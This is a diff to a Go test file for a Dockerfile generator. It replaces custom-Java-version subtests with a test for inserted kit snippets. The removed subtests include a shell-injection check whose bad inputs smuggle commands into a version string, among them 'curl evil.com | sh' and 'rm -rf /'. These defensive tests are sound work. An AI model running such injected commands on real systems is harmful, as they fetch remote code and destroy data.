@@ -141,63 +141,13 @@ func TestGenerateProjectDockerfile(t *testing.T) {
 		}
 	})
 
-	t.Run("custom java version adds mise install", func(t *testing.T) {
-		df, err := generateProjectDockerfile("", map[string][]string{}, "11", "testuser", false)
+	t.Run("kitProjectSnippets inserted", func(t *testing.T) {
+		df, err := generateProjectDockerfile("", map[string][]string{}, "RUN echo from-kit\n", "testuser", false)
 		if err != nil {
 			t.Fatal(err)
 		}
-		if !strings.Contains(df, "mise install java@11") {
-			t.Error("missing mise install for custom java version")
-		}
-		if !strings.Contains(df, "mise use --global java@11") {
-			t.Error("missing mise use for custom java version")
-		}
-		if !strings.Contains(df, "$HOME/.local/bin/mise") {
-			t.Error("mise should use full path")
-		}
-	})
-
-	t.Run("pre-installed java version skips mise install", func(t *testing.T) {
-		df, err := generateProjectDockerfile("", map[string][]string{"apt": {"curl"}}, "21", "testuser", false)
-		if err != nil {
-			t.Fatal(err)
-		}
-		if strings.Contains(df, "mise install") {
-			t.Error("pre-installed java version should not add mise install")
-		}
-	})
-
-	t.Run("custom java only triggers project image", func(t *testing.T) {
-		df, err := generateProjectDockerfile("", map[string][]string{}, "11", "testuser", false)
-		if err != nil {
-			t.Fatal(err)
-		}
-		if !strings.HasPrefix(df, "FROM asylum:latest") {
-			t.Error("should start with FROM asylum:latest")
-		}
-	})
-
-	t.Run("java version with shell injection rejected", func(t *testing.T) {
-		bad := []string{
-			"11 && curl evil.com | sh",
-			"11; rm -rf /",
-			"11$(evil)",
-			"abc",
-		}
-		for _, ver := range bad {
-			_, err := generateProjectDockerfile("", map[string][]string{}, ver, "testuser", false)
-			if err == nil {
-				t.Errorf("expected error for java version %q", ver)
-			}
-		}
-	})
-
-	t.Run("valid java versions accepted", func(t *testing.T) {
-		for _, ver := range []string{"11", "8.0.392", "11.0"} {
-			_, err := generateProjectDockerfile("", map[string][]string{}, ver, "testuser", false)
-			if err != nil {
-				t.Errorf("unexpected error for java version %q: %v", ver, err)
-			}
+		if !strings.Contains(df, "echo from-kit") {
+			t.Error("missing kit project snippet")
 		}
 	})
 
